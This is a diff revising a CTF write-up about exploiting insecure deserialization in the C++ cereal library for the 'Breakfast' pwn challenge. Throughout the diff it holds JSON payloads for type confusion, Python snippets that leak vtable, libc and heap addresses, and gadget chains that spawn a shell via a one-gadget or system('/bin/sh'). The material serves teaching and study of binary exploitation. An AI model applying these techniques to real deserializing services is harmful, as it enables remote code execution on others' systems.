@@ -17,7 +17,7 @@ Deserialization attacks have grown in popularity over the past decade, with majo
 
 Recently, I designed a CTF pwn challenge demonstrating deserialization attacks on a C++ program written with the [cereal library](https://github.com/USCiLab/cereal).
 
-In this post, we'll revisit C++ internals and explore binary exploitation techniques beyond {% abbr "ROP", "Return-Oriented Programming" %}. We’ll learn how even a properly written C++ program could be vulnerable to remote code execution thanks to insecure deserialization.
+In this post, we'll walk through this challenge, revisit C++ internals, and explore binary exploitation techniques beyond {% abbr "ROP", "Return-Oriented Programming" %}. We’ll learn how even a properly written C++ program could be vulnerable to remote code execution thanks to insecure deserialization.
 
 ## The Challenge
 
@@ -27,7 +27,7 @@ The CTF has ended, but the binaries are public! If you want to try solving it or
 
 - Name: Breakfast  
 - Solves: [11](https://github.com/Thehackerscrew/2025.crewc.tf/blob/32e7548fb6c25e5511194e75a142fbcc41aebc8f/api/v1/challenges/28/index.json)
-- Difficulty: Medium?  
+- Difficulty: Easy-Medium?  
 - Description:
 	> They say breakfast is the most important meal of the day. But sometimes you just need milk to avoid Confusing your favourite Type of cereal...
 
@@ -136,7 +136,7 @@ Remind me of the data again?
 
 To better understand the program and how the exploitation works, let's review some C++!
 
-If you're familiar, you may want to skip ahead.
+If you're familiar, you may want to skip ahead to [the analysis](#analysis).
 
 ### What are shared pointers?
 
@@ -195,6 +195,14 @@ Resource destroyed
 A **vtable** (virtual table) is the mechanism that enables runtime polymorphism in C++.
 
 - Each virtual class (any class containing virtual functions) has **one** corresponding virtual table (vtable).
+  
+  {% image "https://pabloariasal.github.io/assets/img/posts/vtables/vpointer.png", "jw-100 alpha-img", "Example of how virtual classes, vtables, and overriding virtual functions is implemented. Credit: Pablo Arias" %}
+  
+  <sup>Example of how virtual classes, vtables, and overriding virtual functions is implemented. Credit: Pablo Arias</sup>
+  {.caption}
+
+  {.no-center}
+
 - The vtable stores an **array of virtual functions**.
 - Each **object** of a virtual class **holds a virtual pointer** (vpointer) which points to the vtable they are instantiated with. The vpointer is a "hidden first member" and precedes other members.
 - When a virtual function is called, dynamic dispatch is carried out by looking up the vtable then jumping to a function at a hard-coded offset. In assembly, this could be seen as a double dereference.
@@ -213,9 +221,9 @@ Key Points for Exploitation: 1) If an attacker controls the vpointer, they can h
 
 ### What is an `std::string`?
 
-We all know what a `string` is in programming, but what does C++'s `std::string` look like?
+We all know what a string is in programming, but what does C++'s `std::string` look like?
 
-If we dig into the source code (which you can find in pretty much any distribution by following the definition of `std::string`), we see the implementation is roughly equivalent to:
+If we dig into the source code, we see the implementation is roughly equivalent to:
 
 ```cpp
 template <class CharT>
@@ -224,6 +232,7 @@ struct basic_string {
   	size_t size; // size_t == uint64_t on 64-bit systems.
     size_t capacity;
 };
+using string = basic_string<char>;
 ```
 
 Ignoring short-string optimisation and other factors, an `std::string` simply consists of three members: the buffer (a pointer to the actual characters), the size, and the capacity of the dynamically allocated memory.
@@ -231,7 +240,7 @@ Ignoring short-string optimisation and other factors, an `std::string` simply co
 This allows for a growable string, suitable for dynamic operations such as append, replace, and remove.
 
 {% alert "success" %}
-Key Point for Exploitation: If we control `buffer`, we can achieve arbitrary memory read.
+Key Point for Exploitation: If we control `buffer` and can observe the string, we can achieve arbitrary memory read.
 {% endalert %}
 
 ## Analysis
@@ -241,6 +250,8 @@ Key Point for Exploitation: If we control `buffer`, we can achieve arbitrary mem
 First step: Understanding what we have, aka enumeration. What protections are in place? What attack primitives are available?
 
 Protections are typically easy to check. Running `checksec`, we see **NX**/**PIE** are enabled. This means shellcode is out of the question. By default, **ASLR** is also enabled, so we'll want some kind of address leak to do anything useful.
+
+{% image "assets/breakfast_checksec.png", "jw-60", "Checksec shows most binary protections are enabled." %}
 
 Looking at the code, we see 3 classes deserialized.
 
@@ -265,7 +276,7 @@ struct Fruit
 
 std::cout << "Remind me of the data again? ";
 std::string input;
-std::getline(std::cin, input);
+std::getline(std::cin, input); // Read input
 
 std::stringstream ss(input);
 cereal::JSONInputArchive archive(ss);
@@ -273,7 +284,7 @@ cereal::JSONInputArchive archive(ss);
 std::shared_ptr<Congee> c;
 std::shared_ptr<Toast> t;
 std::shared_ptr<Fruit> f;
-archive(c, t, f);
+archive(c, t, f); // Deserialization happens here!
 std::cout << "\nc: " << *c << std::endl;
 std::cout << "t: " << *t << std::endl;
 std::cout << "f: " << *f << std::endl;
@@ -335,7 +346,9 @@ struct Fruit {
 For instance:
 - We have control over one type, say `Toast`.
 - We trick Cereal into thinking the second type (`Fruit`) is a `Toast`. This way, we force a `Fruit` and `Toast` to **share the same memory**.
-- When `Fruit` is used, C++ gets confuses. When it tries to print `Fruit::name`, what actually gets printed is `*Toast::vptr` (vtable entry of `Toast`). Calamity!
+- When `Fruit` is used, C++ gets confuses. It tries to print `Fruit::name`, but instead it actually prints `*Toast::vptr` (the vtable entry of `Toast`). Calamity!
+
+{% image "assets/breakfast_type_confusion.png", "jw-80 alpha-imgv", "Diagram of Type Confusion on Toast and Fruit." %}
 
 Together, these primitives are enough to obtain arbitrary code execution!
 
@@ -343,46 +356,39 @@ Together, these primitives are enough to obtain arbitrary code execution!
 
 Great, we've found the chink in the armor. Now let's draft a plan of attack.
 
-1. Leak the VTable address. (`Toast` → `Fruit`) This allows us to bypass ASLR/PIE as we now know the base address of the binary and can calculate offsets to other locations.
+1. Leak the VTable address. (`Toast` → `Fruit`) We can use this to calculate the base address of the binary and offsets to other locations (e.g. {% abbr "GOT", "Global Offset Table" %} entries). This will be useful to bypass ASLR/PIE.
 2. Leak a libc/libcpp address. (`Congee` → `Fruit`) This allows us to calculate offsets to gadgets.
 3. Find a heap address. (`Congee` → `Fruit`) We'll need this address for the next step.
-4. Craft a gadget chain and hijack control flow to point to said chain. (`Congee` → `Toast`) We'll use the 64 bytes available in `Congee` to plant a fake vtable containing a gadget chain. When the virtual function is called, the chain is triggered. (I provided 8 quads of room, but I managed to golf it to only 4 quads.)
+4. Hijack control flow to point to a crafted gadget chain. (`Congee` → `Toast`) We'll use the 64 bytes available in `Congee` to plant a fake vtable containing a gadget chain. When the virtual function is called, the chain is triggered.
 
 ### Leaking the VTable
 
-Leaking the vtable is rather straightforward. We simply set the `id` of our `Fruit` object such that it refers to the `Toast` object. But wait— since `Fruit` is a string, we should make sure the size is non-zero. Luckily, we can control the size using `Toast`'s `spread` parameter.
+Leaking the vtable is rather straightforward. We simply set the `id` of the `Fruit` object to refer to the `Toast` object. But wait— since `Fruit` is a string, we should make sure the size is non-zero. Luckily, we can control the size using the `spread` parameter.
 
 To recap, by type-confusing `Fruit` and controlling `spread`, we map `Toast`'s vpointer to `Fruit`'s string buffer and `Toast`'s `spread` parameter to `Fruit`'s string size.
 
 ```json {data-label=vtable_leak_json}
 {
-    "value0": { // Congee object (unused this time)
+    "value0": { // Congee (unused this time)
         "ptr_wrapper": {
             "id": 2147483649, // id = 1
             "data": {
                 "ingredients": {
-                    "value0": 0,
-                    "value1": 0,
-                    "value2": 0,
-                    "value3": 0,
-                    "value4": 0,
-                    "value5": 0,
-                    "value6": 0,
-                    "value7": 0
+                    // ...
                 }
             }
         }
     },
-    "value1": { // Toast object
+    "value1": { // Toast
         "polymorphic_id": 1073741824,
         "ptr_wrapper": {
             "id": 2147483650, // id = 2
             "data": {
-                "spread": 8 // Control the `size` of the our fake string
+                "spread": 8 // Control the size of the fake string
             }
         }
     },
-    "value2": { // Fruit object
+    "value2": { // Fruit
         "ptr_wrapper": {
             "id": 2 // Refer to the Toast object
         }
@@ -390,19 +396,16 @@ To recap, by type-confusing `Fruit` and controlling `spread`, we map `Toast`'s v
 }
 ```
 
-When deserialized, `t` and `f` share the same object. When `*f` is printed, it will print the first entry of the vtable, which is `Toast::eat`. This is because printing a string will dereference the string buffer and it so happens that the current string buffer is the vtable.
+When deserialized, `t` and `f` share the same object. When `*f` is printed, it will dereference the string buffer (vpointer) and print the first entry of the vtable, which is `Toast::eat`.
 
-```cpp {.line-numbers data-start=73}
-std::shared_ptr<Congee> c;
-std::shared_ptr<Toast> t;
-std::shared_ptr<Fruit> f;
+```cpp {.line-numbers data-start=76}
 archive(c, t, f); // Deserialization happens here
 std::cout << "\nc: " << *c << std::endl;
 std::cout << "t: " << *t << std::endl;
 std::cout << "f: " << *f << std::endl; // Vtable address leaked
 ```
 
-We can do a quick PoC with `xxd`. By changing the initial JSON's `value1.ptr_wrapper.data.spread` and `value2.ptr_wrapper.id` objects, we can induce the binary to spit out 8 weird bytes, which happen to be an address leak of `0x560864bd50c2`! (Hint: It's in little endian, so read the leaked number backwards.)
+We can do a quick PoC with `xxd`, which will allow us to view nonprintable bytes. By changing the initial JSON's `value1.ptr_wrapper.data.spread` and `value2.ptr_wrapper.id` fields, we can induce the binary to spit out 8 weird bytes, which happen to be an address leak of `0x560864bd50c2`! (Hint: It's in little endian, so read the leaked number backwards.)
 
 {% image "assets/breakfast_test_with_xxd.png", "jw-100", "By controlling spread and Fruit's id, we were able to leak 8 bytes of the vtable entry." %}
 
@@ -423,11 +426,11 @@ By printing `t` and `f`, we see that they share the same object.
 
 ### Arbitrary Memory Read!
 
-Now that we have an address from the binary, we can continue on our warpath by leaking a libc address. To do so, we’ll use the `Congee` → `Fruit` primitive which allows control over the properties of an `std::string` and grants us an arbitrary memory read!
+Now that we have an address from the binary, we can continue on our warpath by leaking a libc address. We’ll use the `Congee` → `Fruit` primitive which allows control over the properties of an `std::string` and grants us arbitrary memory read!
 
 ```json {data-label=mem_read_json}
 {
-    "value0": { // Congee object
+    "value0": { // Congee
         "ptr_wrapper": {
             "id": 2147483649, // id = 1
             "data": {
@@ -444,16 +447,10 @@ Now that we have an address from the binary, we can continue on our warpath by l
             }
         }
     },
-    "value1": { // Toast object (unused this time)
-        "polymorphic_id": 1073741824,
-        "ptr_wrapper": {
-            "id": 2147483650,
-            "data": {
-                "spread": 0
-            }
-        }
+    "value1": { // Toast (unused this time)
+        // ...
     },
-    "value2": { // Fruit object
+    "value2": { // Fruit
         "ptr_wrapper": {
             "id": 1 // Refer to Congee object
         }
@@ -461,31 +458,33 @@ Now that we have an address from the binary, we can continue on our warpath by l
 }
 ```
 
-We'll use the GOT entry of `malloc` as the string buffer. GOT entries are a known relative offset in the binary, so we can calculate it from our earlier vtable leak. When the string is printed, the GOT entry will be dereferenced and we get the address of `malloc`.
+We'll use the GOT entry of `malloc` as the string buffer. GOT entries are a fixed relative offset in the binary, so we can calculate it using our earlier vtable leak. When the string is printed, the GOT entry will be dereferenced and we get the address of `malloc`.
 
 ```python
 got_malloc = vtable_addr - e.sym['_ZN5Toast3eatEv'] + e.got['malloc']
-load_json(mem_read_json % (got_malloc, 8, 8)) # % (buffer, size, capacity)
+bytes_ = send_json(mem_read_json % (got_malloc, 8, 32)) # % (buffer, size, capacity)
+malloc_addr = u64(bytes_)
+libc_base = malloc_addr - libc.sym['malloc']
 ```
 
 ### Finding the Heap Address
 
 {% details "Why do we need a heap address?" %}
-During type confusion, we will be controlling a malicious *vpointer* (not the *vtable*!). To actually get control flow hijacking, we want the vpointer to point to a vtable, which can either be found in program memory as a gadget or maliciously crafted and placed within the remaining 7 quadwords of `Congee`. It’s easier to conceive of the latter; thus we need a heap address to the chunk where `Congee` will be allocated.
+During the final stage of type confusion, we will be controlling a malicious *vpointer* (not the *vtable*!). To actually get control flow hijacking, we want the vpointer to point to a vtable, which will be our custom-crafted payload placed among the 7 remaining quadwords of `Congee`. Thus, we need a heap address to the chunk where `Congee` will be allocated.
 {% enddetails %}
 
-To get a simple heap address leak, we can disclose the memory of any heap address. There are several approaches.
+To get a heap address leak, we can use the same memorty read primitive and target an address which *contains a heap address*. There are several approaches.
 
 1. One way is to obtain the main arena, which can be found from libc offset `+0x203ac0`. This then necessitates a convoluted hunt for heap addresses through a sea of indirection.
 	```python
 	main_arena_offset = 0x203ac0
 	main_arena_bins_offset = main_arena_offset + (0xb30 - 0xac0)
 	main_arena_bins_size = 0x7f0
-	load_json(mem_read_json % (libc_base + main_arena_bins_offset, main_arena_bins_size, main_arena_bins_size))
+	bytes_ = send_json(mem_read_json % (libc_base + main_arena_bins_offset, main_arena_bins_size, main_arena_bins_size))
 	# More convoluted parsing...
 	```
 
-2. Alternatively, a simpler method I observed from submissions is to take advantage of a `cereal::base64::chars` string declared globally in the binary.
+2. Alternatively, a simpler method I observed from submissions is to take advantage of the `cereal::base64::chars` string declared globally in the binary.
 	```cpp
 	namespace cereal
 	{
@@ -496,10 +495,11 @@ To get a simple heap address leak, we can disclose the memory of any heap addres
 	      "abcdefghijklmnopqrstuvwxyz"
 	      "0123456789+/";
 	```
-	By reading from this memory, we can leak the string buffer of `cereal::base64::chars`.
+	By reading from this memory, we can leak the heap-allocated buffer of `cereal::base64::chars`.
 	```python
 	base64_chars_addr = vtable_addr + e.sym['_ZN6cereal6base64L5charsE'] - e.sym['_ZN5Toast3eatEv']
-	load_json(mem_read_json % (base64_chars_addr, 8, 32))
+	bytes_ = send_json(mem_read_json % (base64_chars_addr, 8, 32))
+    heap_addr = u64(bytes_)
 	```
 
 For the sake of simplicity, we'll stick with the `cereal::base64::chars` method.
@@ -508,9 +508,9 @@ For the sake of simplicity, we'll stick with the `cereal::base64::chars` method.
 
 By observation, `Congee`’s address remains unchanged between iterations. This means if we know the address of Congee this iteration, we can reuse that address next iteration.
 
-{% image "assets/breakfast_congee_address_unchanged.png", "jw-100", "" %}
+{% image "assets/breakfast_congee_address_unchanged.png", "jw-100", "Notice how the address of the Congee object (c) is consistent across repeated deserializations." %}
 
-Fortunately, this offset from the *heap's base address* is constant and we can calculate it to be `+0x131c0`... at least locally.
+Interestingly, the offset of `c` from the *heap's base address* is constant, and we can calculate it to be `+0x131c0`... at least locally.
 
 {% image "assets/breakfast_congee_heap_offset.png", "jw-100", "" %}
 
@@ -520,42 +520,29 @@ Perhaps that seems too hacky or inelegant to some. What if the offset was random
 
 We can use the bytes in `Congee` to store a canary/needle— some kind of fixed string or pattern. Using our leaked heap address as a reference, we'll perform a giant memory read (e.g. `0x1000` bytes) and look for the needle.
 
-In the following code, we'll look for the fixed pattern `ABCD` (`0x41424344`) preceded by other bytes in Congee.
+In the following code, we'll look for the fixed pattern `ABCD` (`0x41424344`) in Congee.
 
 ```python
-def try_find_heap_block(search_base, length, needle=0x41424344):
-	"""Helper function to send a Congee containing a needle, then searching for that needle."""
-    load_json(mem_read_json % (search_base, length, needle))
-    _, fruit_bytes = parse_output()
-    assert len(fruit_bytes) == length, f'expected to read {length} bytes'
-
-    needle_bytes = p64(search_base) + p64(length) + p64(needle)
-    if needle_bytes in fruit_bytes:
-        # Found the needle, return the address.
-        return search_base + bytes3.index(needle_bytes)
-    else:
-        return None
-
-
+# Find a heap address
 base64_chars_addr = vtable_addr + e.sym['_ZN6cereal6base64L5charsE'] - e.sym['_ZN5Toast3eatEv']
-load_json(mem_read_json % (base64_chars_addr, 8, 32))
-_, fruit_bytes = parse_output()
-heap_addr = u64(fruit_bytes)
+bytes_ = send_json(mem_read_json % (base64_chars_addr, 8, 32))
+heap_addr = u64(bytes_)
+print(f'{heap_addr=:#x}')
 
-search_base = heap_addr
-search_distance = 0x1000 # Use a modest search range. The heap-add
-found_addr = try_find_heap_block(search_base - search_distance, 2 * search_distance)
-assert found_addr is not None
-print(f'FOUND THE CURRENT CHUNK! - {found_addr=:#x}')
+# Find the Congee chunk
+length, needle = 0x1000, 0x41424344
+bytes_ = send_json(mem_read_json % (heap_addr, length, needle))
+assert len(bytes_) == length, f'expected to read {length} bytes'
+assert p64(needle) in bytes_, 'unable to find needle in the haystack, maybe try a larger search length?'
+found_addr = heap_addr + bytes_.index(p64(needle)) - 16
+print(f'FOUND THE CONGEE CHUNK! - {found_addr=:#x}')
 ```
-
-After a quick test run, we confirmed this seems to work.
 
 ## Arbitrary Code Execution (ACE) via Gadget Chains
 
-We finally have enough information to get code execution! To do so, we could construct a gadget chain in `Congee` and trigger the chain by controlling the vpointer in `Toast`.
+We finally have enough information to get code execution! To do so, we will construct a gadget chain in `Congee` and craft the payload such that the virtual function call `t->eat()` will trigger the chain.
 
-{% image "assets/breakfast_virtual-function-call-diagram.png", "jw-100 alpha-imgv", "" %}
+{% image "assets/breakfast_virtual_function_call.png", "jw-80 alpha-imgv", "" %}
 
 <sup>1) When `toast->eat()` is called, the vtable is looked up. Due to type confusion, it actually uses a vpointer we control. 2) We control the vpointer to point to a vtable within the same `Congee` payload. The vtable contains a gadget which is called.</sup>
 {.caption}
@@ -583,12 +570,12 @@ The advantage of PCOP/JOP is that they don't rely on the stack, but rather on th
 
 ### Approach 1: libstdc++ & One-Gadget
 
-Funnily enough, this was the first working solution I came up with— and it's also the shortest payload I've seen so far as it fits within 4 quads.
+Funnily enough, this was the first working solution I came up with— and it's also the shortest payload I've seen so far (4 quads!).
 
-A **One-Gadget** is a gadget which pops a shell if certain conditions are met. By running `one_gadget`, we can find several gadgets which potentially spawn `/bin/sh`.
+A **One-Gadget** is a gadget which pops a shell if certain conditions are met. We can find these gadgets using the [`one_gadget` tool](https://github.com/david942j/one_gadget).
 
-```sh
-# one_gadget -f /usr/lib/x86_64-linux-gnu/libc.so.6
+```sh {.command-line data-prompt="$" data-output=2-100}
+one_gadget -f /usr/lib/x86_64-linux-gnu/libc.so.6
 0x583ec posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
 constraints:
   address rsp+0x68 is writable
@@ -616,9 +603,9 @@ constraints:
   [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
 ```
 
-From here, we could choose any one-gadget for ACE. But to meet the conditions, we should understand the state of the registers **at the moment the virtual function is called**. This calls for some breakpoints!
+From here, we should check which conditions could be achieved; but to do so, we should first understand the state of the registers **at the moment the virtual function is called**. This calls for some breakpoints!
 
-{% image "assets/breakfast_navigate_to_toast_eat_see_regs.png", "", "" %}
+{% image "assets/breakfast_navigate_to_toast_eat_see_regs.png", "jw-100", "Disassembly and registers upon reaching Toast::eat(). Notice the register states of rax, rdi, rsi, and r13. These will be useful when hunting for gadgets." %}
 
 <sup>Disassembly and registers upon reaching `Toast::eat()`, reachable via `b *main+1121; si`.</sup>
 {.caption}
@@ -626,15 +613,18 @@ From here, we could choose any one-gadget for ACE. But to meet the conditions, w
 By navigating to `Toast::eat()`, we notice the following interesting register states:
 
 - `rax == rdi`: non-controllable, address of virtual object (`&*t`)
-	{% image "assets/breakfast_address_of_t.png", "jw-100", "" %}
+	{% image "assets/breakfast_address_of_t.png", "jw-60", "" %}
 - `rdx`: controllable, first address to jump to
 - `rsi == r13 == 0`
 
-Our attention then turns to fulfilling the one-gadget constraints. I chose the third (offset `0xef4ce`) for its relatively simple conditions: we just need `rbx = r12 = 0`. We can hunt for gadgets with tools such as `ROPgadget` or `xgadget` and filter for gadgets which allow control over our desired registers.
+Our attention then turns to fulfilling the one-gadget constraints. I decided to look for gadgets supporting the third one-gadget (offset `0xef4ce`) due to the relatively simple conditions: we just need `rbx = r12 = 0`. We can hunt for gadgets with tools such as [`ROPgadget`](https://github.com/JonathanSalwan/ROPgadget) or [`xgadget`](https://github.com/entropic-security/xgadget). The gadgets we're looking for should:
 
-Importantly, we should ensure the final `call` instruction of a gadget jumps to a desirable offset within `Congee`, e.g. `call [rax+0x10]`. We should also *exclude* gadgets relying on the stack. This means any gadget containing `pop`, `leave`, and `ret`.^[We exclude stack-based gadgets to simplify the exploit, even if an attack with such gadgets may be possible. The reason for doing so is that we don’t have direct control over stack memory. We would need the help of gadgets to push/modify the stack. Even then, modifying the stack without fine-grained control potentially crashes the program. So we explore other alternatives first.]
+1. Overwrite (or provide some control over) the desired registers.
+2. The final `call` instruction of a gadget should jump to a desirable offset within `Congee`, e.g. `call [rax+0x10]`.
+3. We should also *exclude* gadgets relying on the stack. This means any gadget containing `pop`, `leave`, and `ret`.^[We exclude stack-based gadgets to simplify the exploit, even if an attack with such gadgets may be possible. The reason for doing so is that we don’t have direct control over stack memory. We would need the help of gadgets to push/modify the stack. Even then, modifying the stack without fine-grained control potentially crashes the program. So we explore other alternatives first.]
 
 {% image "assets/breakfast_finding_r12.png", "jw-100", "" %}
+
 <sup>Output of `xgadget --reg-overwrite r12 --jop /usr/lib/x86_64-linux-gnu/libstdc++.so.6`. We found a useful `mov r12, rsi` gadget which sets `r12` to 0. Additionally, the gadget will go to `[rax+0x10]` meaning we can place another gadget at the `+0x10` offset to continue the chain.</sup>
 {.caption}
 
@@ -666,12 +656,7 @@ After a while, we ended up with two simple gadgets from `libstdc++`. Constructin
         }
     },
     "value2": { // Fruit (unused)
-        "ptr_wrapper": {
-            "id": 2147483650,
-            "data": {
-                "name": "Apple"
-            }
-        }
+        // ...
     }
 }
 ```
@@ -680,12 +665,12 @@ Congee Ingredients:
 
 {% table %}
 
-| Offset | Value                      | Purpose                                     |
-| ------ | -------------------------- | ------------------------------------------- |
-| `0x00` | address of Congee + `0x08` | vpointer, points to offset `0x08`           |
-| `0x08` | `libstdcpp + 0xf0a0c`      | first gadget, set `r12` to 0 (`r12 = rsi`)  |
-| `0x10` | `libstdcpp + 0xf5e83`      | second gadget, set `rbx` to 0 (`rbx = rsi`) |
-| `0x18` | `libc + 0xef4ce`           | one-gadget, sweet sweet code execution!     |
+| Offset | Value                      | Purpose                                                                               |
+|--------|----------------------------|---------------------------------------------------------------------------------------|
+| `0x00` | address of Congee + `0x08` | vpointer, points to offset `0x08`                                                     |
+| `0x08` | `libstdcpp + 0xf0a0c`      | first gadget, `mov r12, rsi; call qword ptr [rax+0x10];`                              |
+| `0x10` | `libstdcpp + 0xf5e83`      | second gadget, `mov rbx, rsi; mov rsi, rdi; mov rdi, r12; call qword ptr [rax+0x18];` |
+| `0x18` | `libc + 0xef4ce`           | one-gadget, sweet sweet code execution!                                               |
 
 {% endtable %}
 
@@ -697,7 +682,7 @@ The gadget flow is extremely straightforward:
 
 Putting it all together, we get ACE.
 
-{% image "assets/breakfast_full_script_demo.png", "jw-100", "" %}
+{% image "assets/breakfast_full_script_demo.png", "jw-50", "" %}
 
 
 ### Approach 2: `system("/bin/sh")` Gadget Chain
@@ -706,7 +691,7 @@ Credit: Adapted from @erge’s and @lolc4t’s solutions.
 
 I'm sure this gadget chain feels closer to home for ROPpers. The chain works by setting `rdi` to `"/bin/sh"` and calling the `system` function. Despite the need for 6 quads in Congee, I find the chain rather fascinating as it condenses multiple steps into 2 key gadgets.
 
-Another nice aspect about this chain is that it does not rely on too much register state, only on `rax` and `rdi`. (The libstdc++ and one-gadget chain relies on `rsi = 0` which may not always be the case.)
+Another nice aspect about this chain is that it does not rely on too much register state, only `rax` and `rdi` are used. (The libstdc++ and one-gadget chain relies on `rsi = 0` which may not always be the case.)
 
 Congee Ingredients:
 
@@ -727,11 +712,11 @@ The call flow is:
 1. VTable is at Congee address + `0x10` →
 2. gadget at `0x10` (set `rax` to `*(rdi+0x08)`, which is the second Congee entry, or in other words: Congee address + `0x18`) →
 3. gadget at `0x28` (set `rdi` to `"/bin/sh"`) →
-4. gadget at `0x18` (`system` ACE).
+4. gadget at `0x18` (`system` ACE).
 
-To make the this gadget chain work, we require the system, binsh, and `0xa5688` gadget to be **contiguous in memory**. This is because after the `mov rax` in the first step, the subsequent assembly will `call rax+0x10`, which triggers the second gadget to copy `rax+0x08` to `rdi` and then  `call rax`.
+To make the this gadget chain work, we require the system, binsh, and `0xa5688` gadget to be **contiguous in memory**. This is because after `mov rax` in the first gadget, the subsequent assembly will `call [rax+0x10]`, which triggers the second gadget to copy `[rax+0x08]` to `rdi` before `call [rax]`. Each entry in this relative `+0x10`, `+0x08`, and `+0x00` have their unique role to play.
 
-The order of the other gadgets don’t matter as much. Here’s one of the solves from the CTF community. Notice how the first gadget is placed at the end of the Congee payload.
+The order of the other gadgets don’t matter as much. Here’s one of the solves from the CTF community. Notice how the first gadget (`libc + 0x1740b1`) is placed at the end of the Congee payload instead of at offset `0x10`.
 
 ```python
 'ingredients': {
@@ -746,14 +731,14 @@ The order of the other gadgets don’t matter as much. Here’s one of the solve
 }
 ```
 
-<sup>Alternative implementation by @lolc4t.</sup>
+<sup>Alternative solution by @lolc4t.</sup>
 {.caption}
 
 ## Conclusion
 
-This was an interest challenge to make as it helped refresh my binary exploitation skills despite me sucking at pwn challenges. I was also happy that players came up with different solutions, challenging my biases on the concept of a successful gadget chain.
+This was an interest challenge to make as it helped refresh my binary exploitation skills despite me sucking at pwn challenges. I was also happy that players came up with different solutions, challenging my biases on what makes a successful gadget chain.
 
-Overall, this has been a great experience (and hopefully the same goes for others). I have a few variant challenges I might present in future CTFs. We'll see if they make it out.
+Overall, this has been a fun experience exploring and exploiting a niche use case of C++ serialization libraries. I have a few variant challenges I might present in future CTFs. We'll see if they make it out.
 
 Special thanks to [thehackerscrew CTF team](https://www.thehackerscrew.team/) for hosting my CTF challenge and to the players who opened my mind by sharing their solves.
 
@@ -918,29 +903,17 @@ print(f'{libcpp_base=:#x}')
 assert (libcpp_base & 0xfff) == 0
 
 print('\nleak the heap')
-
 base64_chars_addr = vtable_addr + e.sym['_ZN6cereal6base64L5charsE'] - e.sym['_ZN5Toast3eatEv']
-print(f'{base64_chars_addr=:#x}')
 bytes_ = send_json(mem_read_json % (base64_chars_addr, 8, 32))
 heap_addr = u64(bytes_)
+print(f'{heap_addr=:#x}')
 
-
-def try_find_heap_block(search_base, length, needle=0x41424344):
-    bytes_ = send_json(mem_read_json % (search_base, length, needle))
-    assert len(bytes_) == length, f'expected to read {length} bytes'
-
-    needle_bytes = p64(search_base) + p64(length) + p64(needle)
-    if needle_bytes in bytes_:
-        return search_base + bytes_.index(needle_bytes)
-    else:
-        return None
-
-search_base = heap_addr
-search_distance = 0x1000
-found_addr = try_find_heap_block(search_base - search_distance, 2 * search_distance)
-if found_addr is None:
-    raise RuntimeError('did not find needle')
-
+print('\nfind the congee chunk')
+length, needle = 0x1000, 0x41424344
+bytes_ = send_json(mem_read_json % (heap_addr, length, needle))
+assert len(bytes_) == length, f'expected to read {length} bytes'
+assert p64(needle) in bytes_, 'unable to find needle in the haystack, maybe try a larger search length?'
+found_addr = heap_addr + bytes_.index(p64(needle)) - 16
 print(f'FOUND THE CONGEE CHUNK! - {found_addr=:#x}')
 
 """
